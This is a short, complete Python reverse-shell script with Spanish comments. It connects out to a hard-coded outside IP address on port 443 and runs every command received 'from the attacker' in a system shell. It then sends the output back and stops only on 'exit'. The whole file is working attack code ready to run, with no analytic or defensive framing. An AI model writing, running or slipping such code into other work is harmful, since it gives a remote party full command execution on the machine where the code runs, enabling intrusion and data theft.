import socket as s
import subprocess as sp
import os as o

def reverse_shell(ip, port):
    try:
        # Crear un socket
        client = s.socket(s.AF_INET, s.SOCK_STREAM)
        client.connect((ip, port))

        # Redirigir la entrada/salida estándar a través del socket
        while True:
            # Recibir el comando del atacante
            command = client.recv(4096).decode('utf-8').strip()
            if command.lower() == 'exit':
                break
            
            if command:
                try:
                    # Ejecutar el comando recibido
                    output = sp.check_output(command, shell=True, stderr=sp.STDOUT)
                except sp.CalledProcessError as e:
                    output = e.output

                # Manejo de posibles errores en el encoding
                try:
                    client.send(output + b'\n')
                except:
                    client.send(output.decode('utf-8', 'ignore').encode('utf-8') + b'\n')
    
    except Exception as e:
        try:
            client.send(f"Error: {str(e)}".encode('utf-8'))
        except:
            pass
    
    finally:
        client.close()

if __name__ == "__main__":
    reverse_shell('89.117.168.6', 443)
